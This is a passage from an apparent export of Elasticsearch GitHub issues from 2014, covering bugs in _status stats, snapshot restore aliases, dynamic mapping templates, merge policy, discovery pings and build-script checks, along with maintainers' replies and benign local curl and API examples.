    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:722)
```

This reliably reproduces the issue with a clean install of 1.3.3:
- Create 200 indexes, e.g. `&gt;&gt;&gt; for i in range(0, 200): requests.put('http://localhost:9200/foo-%04i' % i, data='{"index": {"number_of_shards": 1, "number_of_replicas": 0}}')`
- `curl localhost:9200/_status`

This, in turn, causes dashboards like Kopf and Head to break.
</description><key id="44318801">7916</key><summary>Stats: _status with #shards &gt;&gt; queue capacity failing with BroadcastShardOperationFailedException</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">alexbrasetvik</reporter><labels><label>:Stats</label><label>bug</label><label>v1.3.4</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-29T17:08:21Z</created><updated>2015-03-19T17:39:45Z</updated><resolved>2014-09-30T09:37:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jprante" created="2014-09-29T22:34:37Z" id="57241080">The cause of this is a change in the management thread pool, see https://github.com/elasticsearch/elasticsearch/issues/7318
</comment><comment author="s1monw" created="2014-09-30T09:37:27Z" id="57289243">this has been fixed by 4d5f6a7bd5edbd2a689bc04745db686a9274c081
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Restore with rewriting could create alias with the same name as index</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7915</link><project id="" key="" /><description>In `/_aliases` it looks like this:

``` json
{
  "statistics-20131006" : {
    "aliases" : {
      "statistics-20131006" : { }
    }
  }
}
```

I restored index `statistics-20131006-compacted` that had alias to `statistics-20131006` with removal of `-compacted` suffix. Now I cannot remove those aliases.

Probably restore process should check for such things. @imotov.
</description><key id="44315960">7915</key><summary>Restore with rewriting could create alias with the same name as index</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">bobrik</reporter><labels><label>bug</label></labels><created>2014-09-29T16:47:17Z</created><updated>2014-10-05T19:38:29Z</updated><resolved>2014-10-05T18:49:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bobrik" created="2014-10-05T18:54:33Z" id="57947823">@imotov, thanks!
</comment><comment author="imotov" created="2014-10-05T19:38:29Z" id="57949276">@bobrik thank you for reporting it!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Disable dynamic mapping with template</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7914</link><project id="" key="" /><description>Hi !

It seems that disable "dynamic" with a template doesn't work ? Here is my template which I can get with this query : `curl "http://localhost:9200/_template/default_mapping?pretty=1"`

``` js
{
  "default_mapping" : {
    "order" : 0,
    "template" : "company_*",
    "settings" : {
      // ...
    },
    "mappings" : {
      "_default_" : {
        "dynamic" : false,
        "properties" : {
          // ...
        },
        "dynamic_date_formats" : [ "yyyy-MM-dd", "dd-MM-yyyy", "dateOptionalTime", "yyyy/MM/dd HH:mm:ss Z", "yyyy/MM/dd Z", "date" ]
      },
      "5252ce4ce4cfcd16f55cfa3d" : {
        "properties" : {
          // ...
        }
      },
      "656d61696c2d746872656164" : {
        "properties" : {
          // ...
        }
      },
      "5252ce4ce4cfcd16f55cfa3a" : {
        "properties" : {
          // ...
        }
      },
      "5252ce4ce4cfcd16f55cfa41" : {
        "properties" : {
          // ...
        }
      },
      "5252ce4ce4cfcd16f55cfa3c" : {
        "properties" : {
          // ...
        }
      },
      "5252ce4ce4cfcd16f55cfa3b" : {
        "properties" : {
          // ...
        }
      },
      "5252ce4ce4cfcd16f55cfa40" : {
        "properties" : {
          // ...
        }
      },
      "5252ce4ce4cfcd16f55cfa3f" : {
        "properties" : {
          // ...
        }
      }
    },
    "aliases" : { }
  }
}
```

Normally, ES won't update the mapping when an unknown property is set. But in fact ... Here is the log of ES with this template : 

```
[2014-09-29 18:17:23,757][INFO ][cluster.metadata         ] [Ogre] [company_54298612814192d3227e86b6] creating index, cause [auto(index api)], shards [5]/[0], mappings [5252ce4ce4cfcd16f55cfa41, _default_, 5252ce4ce4cfcd16f55cfa3d, 5252ce4ce4cfcd16f55cfa3f, 5252ce4ce4cfcd16f55cfa40, 5252ce4ce4cfcd16f55cfa3a, 656d61696c2d746872656164, 5252ce4ce4cfcd16f55cfa3c, 5252ce4ce4cfcd16f55cfa3b]
[2014-09-29 18:17:25,581][INFO ][cluster.metadata         ] [Ogre] [company_54298612814192d3227e86b6] update_mapping [5252ce4ce4cfcd16f55cfa40] (dynamic)
[2014-09-29 18:17:26,681][INFO ][cluster.metadata         ] [Ogre] [company_54298612814192d3227e86b6] update_mapping [5252ce4ce4cfcd16f55cfa3f] (dynamic)
[2014-09-29 18:17:27,421][INFO ][cluster.metadata         ] [Ogre] [company_54298612814192d3227e86b6] deleting index
```

It's seems than disable dynamic mapping works, but why this two lines of log with "update_mapping (dynamic)" ?
</description><key id="44310329">7914</key><summary>Disable dynamic mapping with template</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">Quentin01</reporter><labels><label>feedback_needed</label></labels><created>2014-09-29T15:59:58Z</created><updated>2014-10-21T11:31:20Z</updated><resolved>2014-10-21T11:31:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-10-14T11:40:20Z" id="59029270">Hi @Quentin01 

I simplified the test case a bit, and I don't see what you are seeing, eg:

```
PUT /_template/foo
{
  "template": "foo*",
  "mappings": {
    "_default_": {
      "dynamic": false
    },
    "type_one": {
      "properties": {
        "text": {
          "type": "string"
        }
      }
    }
  }
}

PUT /foo/type_one/1
{
  "foo": "bar",
  "text": "abc"
}
```

The resulting mapping is as expected:

```
{
   "foo": {
      "mappings": {
         "_default_": {
            "dynamic": "false",
            "properties": {}
         },
         "type_one": {
            "dynamic": "false",
            "properties": {
               "text": {
                  "type": "string"
               }
            }
         }
      }
   }
}
```

And in the logs I see:

```
[2014-10-14 13:37:35,538][INFO ][cluster.metadata         ] [Julie Power] [foo] creating index, cause [auto(index api)], shards [5]/[1], mappings [type_one, _default_]
```

This is with version 1.3.4.  What version are you using? Are you able to produce a simple replication of this with v1.3.4?

thanks
</comment><comment author="Quentin01" created="2014-10-21T10:47:21Z" id="59909798">Hi,

With ES 1.3.4, I have the same problem.

```
PUT /_template/default_mapping
{
  "template" : "company_*",
  "mappings" : {
    "_default_" : {
      "dynamic" : false,
      "properties" : {
        "metadata": {
          "type": "object",
          "properties": {
            "path": {
              "type": "string"
            },
            "text": {
              "type": "string",
              "boost": 1.5
            }
          }
        }
      }
    },
    "5252ce4ce4cfcd16f55cfa3c" : {}
  }
}
```

```
PUT /company_test/5252ce4ce4cfcd16f55cfa3c/5446340f63891aa5605ef873-5252ce4ce4cfcd16f55cfa3c
{
  "metadata": { 
    "text": "hello world",
    "path": "/sample-path.txt"
  }
}
```

Here is log of ES.

```
[2014-10-21 12:47:12,568][INFO ][cluster.metadata         ] [Ev Teel Urizen] [company_test] creating index, cause [auto(index api)], shards [5]/[0], mappings [_default_, 5252ce4ce4cfcd16f55cfa3c]
[2014-10-21 12:47:12,735][INFO ][cluster.metadata         ] [Ev Teel Urizen] [company_test] update_mapping [5252ce4ce4cfcd16f55cfa3c] (dynamic)
```

Maybe, it's because I use "_default_" ?
</comment><comment author="clintongormley" created="2014-10-21T11:15:35Z" id="59912504">Ah - you're expecting type `5252ce4ce4cfcd16f55cfa3c` to have no fields?  Or what are you expecting?

The `_default_` mapping is used as the basis for your other mappings.  You can add or override fields, but you can't remove fields.  

It doesn't matter what you index into that type, it will respect the `dynamic:false` and only add the fields that you have listed in `_default_`.
</comment><comment author="Quentin01" created="2014-10-21T11:28:12Z" id="59913679">I expect that `5252ce4ce4cfcd16f55cfa3c` also contains the two properties path and text.

So, the `update_mapping (dynamic)` in log is here because it added fields from `_default_` ?
</comment><comment author="clintongormley" created="2014-10-21T11:31:20Z" id="59913942">@Quentin01 yes, it contains those two fields.  And if you were to index a different field name into that type, it would be ignored.  So yes, the log message is nothing to worry about.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>add more checks to build_release.py</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7913</link><project id="" key="" /><description>When I ran build_release.py to release 1.3.3 I noticed the git clone I
was working from had an extra "elasticsearch" subdirectory (probably I
did this earlier) and git status said "# Your branch is ahead of
'origin/1.3' by 33 commits." which is spooky.

I ran "git clean -f", and Simon suggested "git fetch origin" and sure
enough that fixed "git status" to be "clean" again.

I think the release script should check to make sure there are no
untracked files in the area, there are no uncommitted changes, you
have all changes from origin, and you don't have any unpushed changes.

(Separately we should maybe upgrade the git on the build box ... it's
1.7.9.5 now.)

I tried to make these changes to build_release.py but likely messed it
up (git is ... magical to me).

It seems like it would be best overall if the script just made a fresh
clone of the branch for release?  Seems spooky to reuse a clone from
one release to the next...

I also put in a few other cleanups that I noticed when building
1.3.3.
</description><key id="44309257">7913</key><summary>add more checks to build_release.py</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>build</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-29T15:50:38Z</created><updated>2015-06-07T16:49:45Z</updated><resolved>2014-10-02T10:29:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-09-29T16:42:40Z" id="57189815">Looks good.  I added a couple minor suggestions. 

+1 to using a fresh checkout.  When helping with the 1.3.2 release, I noticed this same problem of a full checkout magically showing up in a subdir.
</comment><comment author="mikemccand" created="2014-09-29T20:45:23Z" id="57226712">OK I folded in your feedback @rjernst (thank you!) and made a couple other small improvements...
</comment><comment author="rjernst" created="2014-09-29T21:24:56Z" id="57232515">LGTM.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix (another) Idaho spelling</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7912</link><project id="" key="" /><description /><key id="44297539">7912</key><summary>Fix (another) Idaho spelling</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">buob</reporter><labels /><created>2014-09-29T14:12:12Z</created><updated>2014-10-14T14:28:34Z</updated><resolved>2014-10-14T11:30:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>[TEST] create client nodes using node.client: true</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7911</link><project id="" key="" /><description>Create client nodes using `node.client: true` instead of `node.data: false` and `node.master: false`.

We should create client nodes in our test infra using the `node.client:true` settings as that is the one that users use, and the one that we use as well in `ClientNodePredicate` thus we end up not finding client nodes otherwise as they weren't created with the proper setting.

Updated also the `DataNodePredicate` so that `client: true` is enough, no need for `data: false` as well.
</description><key id="44288618">7911</key><summary>[TEST] create client nodes using node.client: true</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-29T12:42:34Z</created><updated>2014-09-29T13:58:08Z</updated><resolved>2014-09-29T13:43:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>[TEST] Use Shutdown API only if nodes are on 1.3.3 or newer to prevent shutdown problems</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7910</link><project id="" key="" /><description>This relates to #7885 which causes problems when the shutdown and the kill request happen concurrently.
</description><key id="44288107">7910</key><summary>[TEST] Use Shutdown API only if nodes are on 1.3.3 or newer to prevent shutdown problems</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>test</label><label>v1.3.4</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-29T12:36:20Z</created><updated>2014-10-21T21:40:30Z</updated><resolved>2014-09-29T15:21:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-29T12:42:24Z" id="57154537">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title> one shard initializing,cluster become yellow</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7909</link><project id="" key="" /><description>i'm using  0.90.2 version of elasticsearch. have 6 nodes ;
today,our cluster become yellow,cluster health is:
{
  "cluster_name" : "wowocomes",
  "status" : "green",
  "timed_out" : false,
  "number_of_nodes" : 6,
  "number_of_data_nodes" : 6,
  "active_shards" : 29,
  "relocating_shards" : 0,
  "initializing_shards" : 1,
  "unassigned_shards" : 0
}

log Throws this exception:

[2014-09-29 14:10:04,092][WARN ][action.bulk              ] [172.16.51.215_node_0] Failed to perform bulk/shard on replica [shop_index][4]
org.elasticsearch.transport.RemoteTransportException
Caused by: org.elasticsearch.transport.ResponseHandlerFailureTransportException
Caused by: java.lang.NullPointerException
[2014-09-29 14:10:04,092][WARN ][cluster.action.shard     ] [172.16.51.215_node_0] sending failed shard for [shop_index][4], node[S9RQPI63S7KJ4V_99gaGrw], [R], s[STARTED], reason [Failed to perform [bulk/shard] on replica, message [RemoteTransportException; nested: ResponseHandlerFailureTransportException; nested: NullPointerException; ]]
[2014-09-29 14:10:20,776][WARN ][action.bulk              ] [172.16.51.215_node_0] Failed to perform bulk/shard on replica [shop_index][2]
org.elasticsearch.transport.RemoteTransportException
Caused by: org.elasticsearch.transport.ResponseHandlerFailureTransportException
Caused by: java.lang.NullPointerException

then I restart node for 172.16.51.215_node_0,cluster status become gree!

so,why one shard has been initializing, cannot active?
others,Yesterday our logs was a similar error,but cluster status is gree!
WHY???
</description><key id="44282575">7909</key><summary> one shard initializing,cluster become yellow</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">hya1109</reporter><labels /><created>2014-09-29T11:21:56Z</created><updated>2014-10-14T11:06:15Z</updated><resolved>2014-10-14T11:06:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-29T12:02:39Z" id="57150712">@hya1109 it seems that the bulk operation has run into an error, which causes ES to fail the shard. Normally it should be re-allocated and the cluster should be green. It seems that didn't happen to you and that a restart forced it. To be honest, 0.90.2 is _very_ old and many many things have been fixed since then. It's a bit pointless to chase the exact error. I suggest you upgrade as soon as possible.
</comment><comment author="clintongormley" created="2014-10-14T11:06:15Z" id="59025840">@hya1109 I'm going to close this issue as it refers to a very old version.  Please feel free to reopen if you see anything similar in the latest version.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>During discovery, master fault detection should fall back to cluster state thread upon error</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7908</link><project id="" key="" /><description>With #7834, we simplified ZenDiscovery by making it use the current cluster state for all it's decision. This had the side effect a node may start it's Master FD before the master  has fully processed that cluster state update that adds that node (or elects the master master). This is due to the fact that master FD is started when a node receives a cluster state from the master but the master it self may still be publishing to other node.

 This commit makes sure that a master FD ping is only failed once we know that there is no current cluster state update in progress.
</description><key id="44269974">7908</key><summary>During discovery, master fault detection should fall back to cluster state thread upon error</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-29T08:42:29Z</created><updated>2015-06-07T12:00:01Z</updated><resolved>2014-09-29T09:14:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-29T09:07:11Z" id="57134344">LGTM
</comment><comment author="martijnvg" created="2014-09-29T09:09:36Z" id="57134562">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Show open and closed indices in _cat/indices</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7907</link><project id="" key="" /><description>There doesn't seem to be any other way to definitively and easily list the open/closed indexes in a cluster from what I could see, and it would be really helpful if this option was available in _cat.

Please :)
</description><key id="44260420">7907</key><summary>Show open and closed indices in _cat/indices</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">markwalkom</reporter><labels /><created>2014-09-29T06:11:54Z</created><updated>2015-06-11T14:56:48Z</updated><resolved>2014-10-03T12:14:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="SteveDevOps" created="2015-06-11T14:53:03Z" id="111161037">is there any way to retrieve store.size on closed indices?
</comment><comment author="s1monw" created="2015-06-11T14:56:48Z" id="111162820">@SteveDevOps not that I know of
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Multi-index searches goes out of heap space if running with a big search size</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7906</link><project id="" key="" /><description>To reproduce:
- Create multiple indexes
- Search on all indexes, with a search size of 2_000_000_000
- Run test with a normal, low -Xmx

I expect to be able to set a high search size to return all total values, even if all the indexes are small.

Happens in v. 1.1.2. I haven't tested other versions yet.
I can create a Java Unit test sometime later if you need me to.
</description><key id="44233512">7906</key><summary>Multi-index searches goes out of heap space if running with a big search size</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">magnhaug</reporter><labels /><created>2014-09-28T15:34:15Z</created><updated>2014-10-14T13:41:36Z</updated><resolved>2014-09-28T16:10:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-28T16:10:24Z" id="57090183">It's not caused by multi index search but by the crazy number of document IDs each shard needs to allocate.

If you really need to extract a big amount of docs, please use scan and scroll API.

Closing. Feel free to reopen if you think it's an issue.
</comment><comment author="clintongormley" created="2014-09-30T17:58:17Z" id="57355040">Duplicate of #4026 
</comment><comment author="magnhaug" created="2014-09-30T20:04:13Z" id="57373766">I get that this behavior is not something you'd typically want to do. But is there any reason for a shard of size x documents to allocate a docid container of size y, where y &gt; x?

In the more general case: We do most of our (normal-sized) searches against aliases that point to a few big indexes and a couple dozen smaller indexes. Statically allocating memory for all potential result document IDs on every shard sounds like it's wasting precious memory, especially if not all indexes will produce any hits.
</comment><comment author="clintongormley" created="2014-10-14T13:41:36Z" id="59044973">See #8080
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: upgrade to Lucene 4.10.1 release</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7905</link><project id="" key="" /><description>Lucene 4.10.1 just hit Maven Central ... I'll go upgrade to it.  Should be trivial because I just upgraded to the 4.10.1 snapshot a few days ago...
</description><key id="44197425">7905</key><summary>Internal: upgrade to Lucene 4.10.1 release</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>blocker</label><label>enhancement</label><label>upgrade</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-27T23:53:25Z</created><updated>2015-03-19T14:43:56Z</updated><resolved>2014-09-28T21:57:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-09-28T21:57:26Z" id="57101792">Upgrade is done.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: Optimize with `force=true` can sidestep max segments to merge at once used by delegate</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7904</link><project id="" key="" /><description>The implementation of "forcing" optimize right now will cause the ElasticsearchMergePolicy to return one giant OneMerge if `force==true`.  However, this can cause IO issues.  The existing MP impls chain merging through "cascading", so that no OneMerge merges more than some X segments (e.g. X = 30 for TieredMP).  Forcing should do the same...
</description><key id="44110471">7904</key><summary>Internal: Optimize with `force=true` can sidestep max segments to merge at once used by delegate</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/rjernst/following{/other_user}', u'events_url': u'https://api.github.com/users/rjernst/events{/privacy}', u'organizations_url': u'https://api.github.com/users/rjernst/orgs', u'url': u'https://api.github.com/users/rjernst', u'gists_url': u'https://api.github.com/users/rjernst/gists{/gist_id}', u'html_url': u'https://github.com/rjernst', u'subscriptions_url': u'https://api.github.com/users/rjernst/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/289412?v=4', u'repos_url': u'https://api.github.com/users/rjernst/repos', u'received_events_url': u'https://api.github.com/users/rjernst/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/rjernst/starred{/owner}{/repo}', u'site_admin': False, u'login': u'rjernst', u'type': u'User', u'id': 289412, u'followers_url': u'https://api.github.com/users/rjernst/followers'}</assignee><reporter username="">rjernst</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-26T22:00:25Z</created><updated>2014-10-01T12:55:03Z</updated><resolved>2014-09-29T22:27:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-09-27T08:37:42Z" id="57046470">This is quite nasty: if a shard has many segments, this can suck up lots of RAM, file descriptors, take much longer to run than if we let the merge policy do separate merges ... I wonder how often users are "forcing" their optimize.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Close ping handler's executor service properly</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7903</link><project id="" key="" /><description>For each ping collect phase a send ping listener with a executor service is created. 
If there in flight ping rounds while a node shutdowns this executor service isn't shutdown correctly leaving threads behind.

This PR keeps track of this send ping handlers and closes the executor service. Also the thread pool is now final in SendPingsHandler. There was a possibility that multiple executor service could be created if during the close call the variable was set to null and a ping was still going on.
</description><key id="44104511">7903</key><summary>Close ping handler's executor service properly</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Discovery</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-26T20:45:11Z</created><updated>2015-06-06T19:26:55Z</updated><resolved>2014-09-26T22:27:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-26T20:52:47Z" id="57018898">left some comments
</comment><comment author="s1monw" created="2014-09-26T21:28:24Z" id="57022918">LGTM @bleskes your call
</comment><comment author="bleskes" created="2014-09-26T21:43:58Z" id="57024516">If left two little comments. o.w. LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Posting a mapping with default analyzer fails</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7902</link><project id="" key="" /><description>Closes #2716

When merging two mappings, default index analyzers are represented by either null or by a "default"-named index analyzer object. Fixed a spot where only the null representation was being considered as default.

Wrote a simple REST test to confirm the behavior is fixed. All tests pass.
